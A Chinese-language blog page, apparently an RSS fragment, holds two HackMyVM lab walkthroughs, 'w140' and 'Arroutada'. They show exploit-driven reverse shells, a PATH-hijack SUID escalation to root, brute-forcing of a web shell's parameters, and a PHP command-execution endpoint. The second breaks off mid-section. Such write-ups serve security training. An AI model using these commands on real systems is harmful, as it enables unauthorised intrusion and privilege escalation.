┌──(kali㉿kali)-[~/test/CVE-2022-23935]
└─$ source env/bin/activate
                                                                                                                                    
┌──(env)─(kali㉿kali)-[~/test/CVE-2022-23935]
└─$ pip3 install pwntools
Collecting pwntools
  Using cached pwntools-4.14.0-py2.py3-none-any.whl.metadata (5.3 kB)
Collecting paramiko&gt;=1.15.2 (from pwntools)
  Downloading paramiko-3.5.1-py3-none-any.whl.metadata (4.6 kB)
Collecting mako&gt;=1.0.0 (from pwntools)
  Downloading Mako-1.3.9-py3-none-any.whl.metadata (2.9 kB)
Collecting pyelftools&gt;=0.29 (from pwntools)
  Using cached pyelftools-0.31-py3-none-any.whl.metadata (381 bytes)
Collecting capstone&gt;=3.0.5rc2 (from pwntools)
  Using cached capstone-6.0.0a3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.8 kB)
Collecting ropgadget&gt;=5.3 (from pwntools)
  Using cached ROPGadget-7.6-py3-none-any.whl.metadata (1.0 kB)
Collecting pyserial&gt;=2.7 (from pwntools)
  Using cached pyserial-3.5-py2.py3-none-any.whl.metadata (1.6 kB)
Collecting requests&gt;=2.0 (from pwntools)
  Using cached requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
Requirement already satisfied: pip&gt;=6.0.8 in ./env/lib/python3.12/site-packages (from pwntools) (25.0)
Collecting pygments&gt;=2.0 (from pwntools)
  Using cached pygments-2.19.1-py3-none-any.whl.metadata (2.5 kB)
Collecting pysocks (from pwntools)
  Using cached PySocks-1.7.1-py3-none-any.whl.metadata (13 kB)
Collecting python-dateutil (from pwntools)
  Using cached python_dateutil-2.9.0.post0-py2.py3-none-any.whl.metadata (8.4 kB)
Collecting packaging (from pwntools)
  Using cached packaging-24.2-py3-none-any.whl.metadata (3.2 kB)
Collecting psutil&gt;=3.3.0 (from pwntools)
  Using cached psutil-6.1.1-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (22 kB)
Collecting intervaltree&gt;=3.0 (from pwntools)
  Using cached intervaltree-3.1.0-py2.py3-none-any.whl
Collecting sortedcontainers (from pwntools)
  Using cached sortedcontainers-2.4.0-py2.py3-none-any.whl.metadata (10 kB)
Collecting unicorn&gt;=2.0.1 (from pwntools)
  Using cached unicorn-2.1.1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.3 kB)
Collecting six&gt;=1.12.0 (from pwntools)
  Using cached six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
Collecting rpyc (from pwntools)
  Using cached rpyc-6.0.1-py3-none-any.whl.metadata (3.5 kB)
Collecting colored_traceback (from pwntools)
  Using cached colored_traceback-0.4.2-py3-none-any.whl.metadata (4.6 kB)
Collecting unix-ar (from pwntools)
  Using cached unix_ar-0.2.1-py2.py3-none-any.whl.metadata (1.9 kB)
Collecting zstandard (from pwntools)
  Using cached zstandard-0.23.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.0 kB)
Collecting MarkupSafe&gt;=0.9.2 (from mako&gt;=1.0.0-&gt;pwntools)
  Using cached MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.0 kB)
Collecting bcrypt&gt;=3.2 (from paramiko&gt;=1.15.2-&gt;pwntools)
  Using cached bcrypt-4.2.1-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (9.8 kB)
Collecting cryptography&gt;=3.3 (from paramiko&gt;=1.15.2-&gt;pwntools)
  Using cached cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (5.7 kB)
Collecting pynacl&gt;=1.5 (from paramiko&gt;=1.15.2-&gt;pwntools)
  Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl.metadata (8.6 kB)
Collecting charset-normalizer&lt;4,&gt;=2 (from requests&gt;=2.0-&gt;pwntools)
  Using cached charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)
Collecting idna&lt;4,&gt;=2.5 (from requests&gt;=2.0-&gt;pwntools)
  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3&lt;3,&gt;=1.21.1 (from requests&gt;=2.0-&gt;pwntools)
  Using cached urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi&gt;=2017.4.17 (from requests&gt;=2.0-&gt;pwntools)
  Using cached certifi-2025.1.31-py3-none-any.whl.metadata (2.5 kB)
Collecting plumbum (from rpyc-&gt;pwntools)
  Using cached plumbum-1.9.0-py3-none-any.whl.metadata (10 kB)
Collecting cffi&gt;=1.12 (from cryptography&gt;=3.3-&gt;paramiko&gt;=1.15.2-&gt;pwntools)
  Using cached cffi-1.17.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.5 kB)
Collecting pycparser (from cffi&gt;=1.12-&gt;cryptography&gt;=3.3-&gt;paramiko&gt;=1.15.2-&gt;pwntools)
  Using cached pycparser-2.22-py3-none-any.whl.metadata (943 bytes)
Using cached pwntools-4.14.0-py2.py3-none-any.whl (12.9 MB)
Using cached capstone-6.0.0a3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Downloading Mako-1.3.9-py3-none-any.whl (78 kB)
Downloading paramiko-3.5.1-py3-none-any.whl (227 kB)
Using cached psutil-6.1.1-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (287 kB)
Using cached pyelftools-0.31-py3-none-any.whl (180 kB)
Using cached pygments-2.19.1-py3-none-any.whl (1.2 MB)
Using cached pyserial-3.5-py2.py3-none-any.whl (90 kB)
Using cached requests-2.32.3-py3-none-any.whl (64 kB)
Using cached ROPGadget-7.6-py3-none-any.whl (32 kB)
Using cached six-1.17.0-py2.py3-none-any.whl (11 kB)
Using cached sortedcontainers-2.4.0-py2.py3-none-any.whl (29 kB)
Using cached unicorn-2.1.1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (16.2 MB)
Using cached colored_traceback-0.4.2-py3-none-any.whl (5.5 kB)
Using cached packaging-24.2-py3-none-any.whl (65 kB)
Using cached PySocks-1.7.1-py3-none-any.whl (16 kB)
Using cached python_dateutil-2.9.0.post0-py2.py3-none-any.whl (229 kB)
Using cached rpyc-6.0.1-py3-none-any.whl (74 kB)
Using cached unix_ar-0.2.1-py2.py3-none-any.whl (6.5 kB)
Using cached zstandard-0.23.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (5.4 MB)
Using cached bcrypt-4.2.1-cp39-abi3-manylinux_2_28_x86_64.whl (278 kB)
Using cached certifi-2025.1.31-py3-none-any.whl (166 kB)
Using cached charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (145 kB)
Using cached cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl (4.2 MB)
Using cached idna-3.10-py3-none-any.whl (70 kB)
Using cached MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (23 kB)
Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)
Using cached urllib3-2.3.0-py3-none-any.whl (128 kB)
Using cached plumbum-1.9.0-py3-none-any.whl (127 kB)
Using cached cffi-1.17.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (479 kB)
Using cached pycparser-2.22-py3-none-any.whl (117 kB)
Installing collected packages: unicorn, sortedcontainers, pyserial, pyelftools, zstandard, urllib3, unix-ar, six, pysocks, pygments, pycparser, psutil, plumbum, packaging, MarkupSafe, intervaltree, idna, charset-normalizer, certifi, capstone, bcrypt, rpyc, ropgadget, requests, python-dateutil, mako, colored_traceback, cffi, pynacl, cryptography, paramiko, pwntools
Successfully installed MarkupSafe-3.0.2 bcrypt-4.2.1 capstone-6.0.0a3 certifi-2025.1.31 cffi-1.17.1 charset-normalizer-3.4.1 colored_traceback-0.4.2 cryptography-44.0.0 idna-3.10 intervaltree-3.1.0 mako-1.3.9 packaging-24.2 paramiko-3.5.1 plumbum-1.9.0 psutil-6.1.1 pwntools-4.14.0 pycparser-2.22 pyelftools-0.31 pygments-2.19.1 pynacl-1.5.0 pyserial-3.5 pysocks-1.7.1 python-dateutil-2.9.0.post0 requests-2.32.3 ropgadget-7.6 rpyc-6.0.1 six-1.17.0 sortedcontainers-2.4.0 unicorn-2.1.1 unix-ar-0.2.1 urllib3-2.3.0 zstandard-0.23.0
                                                                                                                                    
┌──(env)─(kali㉿kali)-[~/test/CVE-2022-23935]
└─$ python3 CVE-2022-23935.py 192.168.205.128 8888
/home/kali/test/CVE-2022-23935/CVE-2022-23935.py:14: SyntaxWarning: invalid escape sequence '\ '
  print('''
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.12/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or /home/kali/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.0)
[+] Connected!!!!

   _____ __      __ ______      ___    ___  ___   ___        ___   ____    ___  ____   _____ 
  / ____|\ \    / /|  ____|    |__ \  / _ \|__ \ |__ \      |__ \ |___ \  / _ \|___ \ | ____|
 | |      \ \  / / | |__  ______  ) || | | |  ) |   ) |______  ) |  __) || (_) | __) || |__  
 | |       \ \/ /  |  __||______|/ / | | | | / /   / /|______|/ /  |__ &lt;  \__, ||__ &lt; |___ \ 
 | |____    \  /   | |____      / /_ | |_| |/ /_  / /_       / /_  ___) |   / / ___) | ___) |
  \_____|    \/    |______|    |____| \___/|____||____|     |____||____/   /_/ |____/ |____/       

                                            by 0xFTW                                                                              
      
[+] Trying to bind to :: on port 8888: Done
[+] Waiting for connections on :::8888: Got connection from ::ffff:192.168.205.131 on port 37880
[*] Switching to interactive mode
bash: cannot set terminal process group (376): Inappropriate ioctl for device
bash: no job control in this shell
www-data@w140:/var/www/uploads/1738979826$ $ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![image-20250331185917326](https://7r1umphk.github.io/image/20250331185917403.png)

# 3.提权

```
www-data@w140:/var/www/uploads/1738979826$ $ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
www-data@w140:/var/www/uploads/1738979826$ $ cd ..
cd ..
www-data@w140:/var/www/uploads$ $ ls -la
ls -la
total 16
drwx------ 4 www-data root     4096 Feb  7 20:57 .
drwxr-xr-x 4 root     root     4096 Feb 21  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Feb  7 20:51 1738979493
drwxr-xr-x 2 www-data www-data 4096 Feb  7 20:57 1738979826
www-data@w140:/var/www/uploads$ $ cd ..
cd ..
www-data@w140:/var/www$ $ ls -al
ls -al
total 48
drwxr-xr-x  4 root     root  4096 Feb 21  2023 .
drwxr-xr-x 12 root     root  4096 Jan 29  2023 ..
-rw-r--r--  1 root     root 28744 Feb 21  2023 .w140.png
drwxr-xr-x  7 root     root  4096 Feb 14  2023 html
drwx------  4 www-data root  4096 Feb  7 20:57 uploads
```

有个图片传过来看看

![image-20250331185924540](https://7r1umphk.github.io/image/20250331185924622.png)

qr，我们识别一下

![image-20250331185931745](https://7r1umphk.github.io/image/20250331185931796.png)

登录

```
www-data@w140:/var/www$ $ cd /home/
cd /home/
www-data@w140:/home$ $ ls
ls
ghost
www-data@w140:/home$ $ su - ghost
su - ghost
Password: $ BaoeCblP5KGJDmA
$ id
uid=1000(ghost) gid=1000(ghost) groups=1000(ghost),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
$ sudo -l
Matching Defaults entries for ghost on w140:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ghost may run the following commands on w140:
    (root) SETENV: NOPASSWD: /opt/Benz-w140
```

看到SETENV，我就知道是环境变量劫持了

```
$ cd /opt/
$ ls -la
total 20
drwxr-xr-x  3 root root 4096 Feb 18  2023 .
drwxr-xr-x 18 root root 4096 Jan 29  2023 ..
-rw-------  1 root root    5 Feb 18  2023 .bashre
-rwxr-xr-x  1 root root  423 Feb 17  2023 Benz-w140
drwxr-xr-x  8 root root 4096 Dec  8  2021 exiftool
$ cat /opt/Benz-w140
                                                                                                             
#!/bin/bash
. /opt/.bashre
cd /home/ghost/w140    

# clean up log files
if [ -s log/w140.log ] &amp;&amp; ! [ -L log/w140.log ]
then
/bin/cat log/w140.log &gt; log/w140.log.old
/usr/bin/truncate -s@ log/w140.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

find没有绝对地址，所以

```
$ cd /tmp/
$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' &gt; find
$ chmod +x find
$ ls -la
total 836
drwxrwxrwt  2 root     root       4096 Feb  7 21:11 .
drwxr-xr-x 18 root     root       4096 Jan 29  2023 ..
-rwxr-xr-x  1 ghost    ghost        39 Feb  7 21:11 find
-rwxr-xr-x  1 www-data www-data 839766 Jan 29 04:04 linpeas.sh
$ cat find
cp /bin/bash /tmp/sh;chmod u+s /tmp/sh
$ sudo PATH=$PWD:$PATH /opt/Benz-w140
/opt/Benz-w140: 4: cd: can't cd to /home/ghost/w140
$ ls -la
total 2044
drwxrwxrwt  2 root     root        4096 Feb  7 21:13 .
drwxr-xr-x 18 root     root        4096 Jan 29  2023 ..
-rwxr-xr-x  1 ghost    ghost         39 Feb  7 21:11 find
-rwxr-xr-x  1 www-data www-data  839766 Jan 29 04:04 linpeas.sh
-rwsr-xr-x  1 root     root     1234376 Feb  7 21:13 sh
$ /tmp/sh -p
$ id
uid=1000(ghost) gid=1000(ghost) euid=0(root) groups=1000(ghost),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```



&lt;!-- ##{'timestamp':1739012133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_w140.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_Arroutada</title><link>https://7r1UMPHK.github.io/post/hmv_Arroutada.html</link><description># 0.简介

靶机：https://hackmyvm.eu/machines/machine.php?vm=Arroutada
 难度：绿色
 目标 IP：192.168.205.151
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.151
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:47 CST
Nmap scan report for 192.168.205.151
Host is up (0.00024s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:06:46:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.24 ms 192.168.205.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
                                                        
```

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.151
&lt;div align='center'&gt;&lt;img src='imgs/apreton.png'&gt;&lt;/div&gt;
```

爆破目录

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.151 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.151
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/.                    (Status: 200) [Size: 59]
/imgs                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.151/imgs/]
/scout                (Status: 301) [Size: 318] [--&gt; http://192.168.205.151/scout/]
Progress: 598000 / 598005 (100.00%)
===============================================================                                                                      
Finished
===============================================================
```

查看/scout

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.151/scout/

&lt;div&gt;
&lt;p&gt;
Hi, Telly,
&lt;br&gt;
&lt;br&gt;
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
&lt;br&gt;
/scout/******/docs/
&lt;br&gt;
&lt;br&gt;
With continued gratitude,
&lt;br&gt;
J1.
&lt;/p&gt;
&lt;/div&gt;
&lt;!-- Stop please --&gt;
```

爆破

```
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u '192.168.205.151/scout/FUZZ/docs/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 28 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/scout/FUZZ/docs/
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000021664:   200        1016 L   12059 W    189769 Ch   'j2'                                                                

Total time: 59.22016
Processed Requests: 119600
Filtered Requests: 119599
Requests/sec.: 2019.582
```

![image-20250331185406586](https://7r1umphk.github.io/image/20250331185406653.png)

pass.txt是废话，直接下shellfile.ods，然后有密码，我们爆破一下

```
┌──(kali㉿kali)-[~/test]
└─$ file shellfile.ods                                            
shellfile.ods: OpenDocument Spreadsheet
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash             
Using default input encoding: UTF-8
Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 512/512 AVX512BW 16x BF/AES])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john11           (shellfile.ods)   
1g 0:00:00:08 DONE (2025-02-08 16:53) 0.1177g/s 1967p/s 1967c/s 1967C/s lachina..idiot
Use the '--show --format=ODF' options to display all of the cracked passwords reliably
Session completed. 
```

打开给了我们一个路径/thejabasshell.php，点进去是空白的，所以我们进行爆破

```
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/thejabasshell.php?FUZZ=id
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000280:   200        0 L      5 W        33 Ch       'a'                                                                 
000000557:   200        0 L      0 W        0 Ch        'Controls'                                                          

Total time: 0
Processed Requests: 474
Filtered Requests: 473
Requests/sec.: 0

┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.151/thejabasshell.php?a=id
Error: Problem with parameter 'b'                                                                                                                                
```

还要一个b的参数

```
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?a=id&amp;b=FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 5
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/thejabasshell.php?a=id&amp;b=FUZZ
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000001999:   200        1 L      3 W        54 Ch       'pass'                                                              
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 41.29983
Processed Requests: 56690
Filtered Requests: 56689
Requests/sec.: 1372.644

┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.151/thejabasshell.php?a=id&amp;b=pass'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                        
```

使用a参数弹个shell回来就好了

# 3. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
www-data@arroutada:/var/www/html$ ls -al
total 24
drwxr-xr-x  4 root root 4096 Jan  8  2023 .
drwxr-xr-x  3 root root 4096 Jan  8  2023 ..
drwxr-xr-x  2 root root 4096 Jan  8  2023 imgs
-rw-r--r--  1 root root   59 Jan  8  2023 index.html
drwxr-xr-x 22 root root 4096 Jan  8  2023 scout
-rw-r--r--  1 root root  174 Jan  8  2023 thejabasshell.php
www-data@arroutada:/var/www/html$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
www-data@arroutada:/var/www/html$ cd ..
www-data@arroutada:/var/www$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Jan  8  2023 .
drwxr-xr-x 12 root root 4096 Jan  8  2023 ..
drwxr-xr-x  4 root root 4096 Jan  8  2023 html
www-data@arroutada:/var/www$ cd ..
www-data@arroutada:/var$ ls -al
total 48
drwxr-xr-x 12 root root  4096 Jan  8  2023 .
drwxr-xr-x 18 root root  4096 Jan  8  2023 ..
drwxr-xr-x  2 root root  4096 Sep  3  2022 backups
drwxr-xr-x 10 root root  4096 Jan  8  2023 cache
drwxr-xr-x 26 root root  4096 Jan  8  2023 lib
drwxrwsr-x  2 root staff 4096 Sep  3  2022 local
lrwxrwxrwx  1 root root     9 Jan  8  2023 lock -&gt; /run/lock
drwxr-xr-x  8 root root  4096 Jan  8  2023 log
drwxrwsr-x  2 root mail  4096 Jan  8  2023 mail
drwxr-xr-x  2 root root  4096 Jan  8  2023 opt
lrwxrwxrwx  1 root root     4 Jan  8  2023 run -&gt; /run
drwxr-xr-x  4 root root  4096 Jan  8  2023 spool
drwxrwxrwt  2 root root  4096 Feb  8 03:46 tmp
drwxr-xr-x  3 root root  4096 Jan  8  2023 www
www-data@arroutada:/var$ cd /home/
www-data@arroutada:/home$ ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jan  8  2023 .
drwxr-xr-x 18 root  root  4096 Jan  8  2023 ..
drwxr-x---  3 drito drito 4096 Jan 10  2023 drito
www-data@arroutada:/home$ cd /opt/
www-data@arroutada:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Jan  8  2023 .
drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
www-data@arroutada:/opt$ cd /tmp/
www-data@arroutada:/tmp$ sl -al
bash: sl: command not found
www-data@arroutada:/tmp$ ls -al
total 8
drwxrwxrwt  2 root root 4096 Feb  8 03:46 .
drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
www-data@arroutada:/tmp$ cd /
www-data@arroutada:/$ ls -la
total 68
drwxr-xr-x  18 root root  4096 Jan  8  2023 .
drwxr-xr-x  18 root root  4096 Jan  8  2023 ..
lrwxrwxrwx   1 root root     7 Jan  8  2023 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 Jan  8  2023 boot
drwxr-xr-x  17 root root  3140 Feb  8 03:46 dev
drwxr-xr-x  66 root root  4096 Feb  8 03:46 etc
drwxr-xr-x   3 root root  4096 Jan  8  2023 home
lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img -&gt; boot/initrd.img-5.10.0-20-amd64
lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Jan  8  2023 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Jan  8  2023 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Jan  8  2023 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Jan  8  2023 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 Jan  8  2023 lost+found
drwxr-xr-x   3 root root  4096 Jan  8  2023 media
drwxr-xr-x   2 root root  4096 Jan  8  2023 mnt
drwxr-xr-x   2 root root  4096 Jan  8  2023 opt
dr-xr-xr-x 150 root root     0 Feb  8 03:46 proc
drwx------   3 root root  4096 Jan  8  2023 root
drwxr-xr-x  17 root root   480 Feb  8 03:46 run
lrwxrwxrwx   1 root root     8 Jan  8  2023 sbin -&gt; usr/sbin
drwxr-xr-x   2 root root  4096 Jan  8  2023 srv
dr-xr-xr-x  13 root root     0 Feb  8 03:46 sys
drwxrwxrwt   2 root root  4096 Feb  8 03:46 tmp
drwxr-xr-x  14 root root  4096 Jan  8  2023 usr
drwxr-xr-x  12 root root  4096 Jan  8  2023 var
lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-20-amd64
lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
www-data@arroutada:/$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
www-data@arroutada:/$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@arroutada:/$ ss -tnlup
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                              
tcp                     LISTEN                   0                        4096                                           127.0.0.1:8000                                            0.0.0.0:*                                              
tcp                     LISTEN                   0                        511                                                    *:80                                                    *:*             
```

有个8000端口没有公开，所以我们要转发，但是它socat少了so，那我们直接找其他的工具吧

```
www-data@arroutada:/tmp$ curl http://127.0.0.1:5000
bash: curl: command not found
www-data@arroutada:/tmp$ wget http://127.0.0.1:8000
--2025-02-08 04:00:55--  http://127.0.0.1:8000/
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 319 [text/html]
Saving to: 'index.html'

index.html                                                   0%[                                                                       index.html                                                 100%[========================================================================================================================================&gt;]     319  --.-KB/s    in 0s    

2025-02-08 04:00:55 (116 MB/s) - 'index.html' saved [319/319]

www-data@arroutada:/tmp$ ls -la
total 476
drwxrwxrwt  2 root     root       4096 Feb  8 04:00 .
drwxr-xr-x 18 root     root       4096 Jan  8  2023 ..
-rw-r--r--  1 www-data www-data    319 Feb  8 04:00 index.html
-rwxr-xr-x  1 www-data www-data 473256 Jan 29 19:48 socat
www-data@arroutada:/tmp$ cat index.html 
&lt;h1&gt;Service under maintenance&lt;/h1&gt;


&lt;br&gt;


&lt;h6&gt;This site is from ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.+++++++++++..&lt;&lt;++.&gt;++.&gt;-----------.++.++++++++.&lt;+++++.&gt;++++++++++++++.&lt;+++++++++.---------.&lt;.&gt;&gt;-----------------.-------.++.++++++++.------.+++++++++++++.+.&lt;&lt;+..&lt;/h6&gt;

&lt;!-- Please sanitize /priv.php --&gt;
```

![image-20250331185429009](https://7r1umphk.github.io/image/20250331185429071.png)

那我们看它提示的/priv.php

```
www-data@arroutada:/tmp$ wget http://127.0.0.1:8000/priv.php
--2025-02-08 04:01:52--  http://127.0.0.1:8000/priv.php
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'priv.php'

priv.php                                                       [&lt;=&gt;                                                                    priv.php                                                       [ &lt;=&gt;                                                                                                                                     ]     308  --.-KB/s    in 0s    

2025-02-08 04:01:52 (111 MB/s) - 'priv.php' saved [308]

www-data@arroutada:/tmp$ cat priv.php 
Error: the 'command' parameter is not specified in the request body.

/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the 'command' parameter is not specified in the request body.';
}

*/
```

说我们少了参数，我们加上就好了

```
